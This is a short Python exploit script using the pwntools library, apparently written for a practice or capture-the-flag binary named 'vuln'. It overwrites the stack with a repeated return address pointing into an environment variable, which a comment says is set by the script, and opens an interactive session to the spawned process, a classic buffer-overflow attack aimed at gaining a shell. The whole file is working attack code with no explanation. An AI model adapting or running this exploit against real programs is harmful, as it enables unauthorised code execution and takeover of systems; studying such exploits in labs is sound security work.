#!/usr/bin/env python
from pwn import *

payload = ''
# Address of env variable A
# export A=$(./script.py)
ret_address = p32(0xffff9443 + 1000)

payload += ret_address * 100

p = process(['./vuln', payload])

p.interactive()
